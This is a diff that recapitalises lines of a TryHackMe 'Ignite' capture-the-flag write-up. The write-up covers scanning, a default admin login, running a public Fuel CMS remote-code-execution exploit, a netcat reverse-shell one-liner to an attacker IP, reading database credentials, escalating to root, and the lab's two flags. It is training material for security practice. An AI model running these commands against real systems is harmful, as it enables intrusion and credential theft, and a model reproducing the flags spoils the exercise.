@@ -1,11 +1,11 @@
 [THM](https://tryhackme.com/room/ignite)
 
-finding the ip
+Finding the IP
 ```
 sudo arp-scan -l
 ```
 
-nmap scan:
+Nmap scan:
 ```
 nmap -sV -O -T4 --min-rate=10000 $ip
 ```
@@ -20,7 +20,7 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.14
 ```
 
-gobuster:
+Gobuster:
 ```
 gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
 ```
@@ -57,17 +57,17 @@ output
 /robots.txt           (Status: 200) [Size: 30]
 /server-status        (Status: 403) [Size: 301]
 ```
-from the results
+From the results
 - Normal 200 OK responses on `/index.php`, `/home`, `/offline`, `/robots.txt`.
 - `/assets` redirects (301) to a directory.
 
-saw a login page at `fuel/login`
-logged using 
+Saw a login page at `fuel/login`
+Logged in using 
 admin
 admin
-didn't find anything useful
+Didn't find anything useful
 
-used searchsploit for fuel cms
+Used Searchsploit for Fuel CMS
 ```
 searchsploit fuel 1.4
 ```
@@ -81,7 +81,7 @@ Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                            
 Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                  | php/webapps/48778.txt
 ```
 
-download the exploit `Fuel CMS 1.4.1 - Remote Code Execution (3)`
+Download the exploit `Fuel CMS 1.4.1 - Remote Code Execution (3)`
 ```
 searchsploit -m "php/webapps/50477.py"
 ```
@@ -96,7 +96,7 @@ File Type: Python script, ASCII text executable
 Copied to: /home/aswil/Trash/50477.py
 ```
 
-run the exploit
+Run the exploit
 ```
 python3 50477.py -u http://$ip
 ```
@@ -127,7 +127,7 @@ VERSION_CODENAME=xenial
 UBUNTU_CODENAME=xenial
 ```
 
-check nc
+Check nc
 ```
 Enter Command $which nc
 ```
@@ -136,25 +136,25 @@ output
 system/bin/nc
 ```
 
-attempt for a revshell
+Attempt for a reverse shell
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.170.71.2 1337 >/tmp/f
 ```
-listener
+Listener
 ```
 nc -lnvp 1337
 ```
-got the reverse shell
+Got the reverse shell
 
-to get a more stable shell and moved to `/tmp`
+To get a more stable shell and moved to `/tmp`
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 cd /tmp
 ```
 
-hosted a python server
-downloaded `linpeas.sh`
-run linpeas.sh
+Hosted a Python server
+Downloaded `linpeas.sh`
+Run linpeas.sh
 ```
 chmod +x linpeas.sh
 ./linpeas.sh
@@ -170,7 +170,7 @@ output
 	'database' => 'fuel_schema',
 ```
 
-read the file `/var/www/html/fuel/application/config/database.php`
+Read the file `/var/www/html/fuel/application/config/database.php`
 ```
 cat /var/www/html/fuel/application/config/database.php
 ```
@@ -196,9 +196,9 @@ output
 	'failover' => array(),
 	'save_queries' => TRUE
 ```
-got the password as `mememe`
+Got the password as `mememe`
 
-switch user
+Switch user
 ```
 www-data@ubuntu:/tmp$ sudo su
 sudo su
@@ -213,7 +213,7 @@ root@ubuntu:/var/www/html/fuel/application/config#
 ```
 Access Granted ROOT
 
-read the flag
+Read the flag
 ```
 root@ubuntu:/var/www/html/fuel/application/config# cd /root
 cd /root
@@ -238,5 +238,5 @@ cat flag.txt
 6470e394cbf6dab6a91682cc8585059b 
 ```
 
-user flag: `6470e394cbf6dab6a91682cc8585059b`
-root flag: `b9bbcb33e11b80be759c4e844862482d`
+User flag: `6470e394cbf6dab6a91682cc8585059b`
+Root flag: `b9bbcb33e11b80be759c4e844862482d`
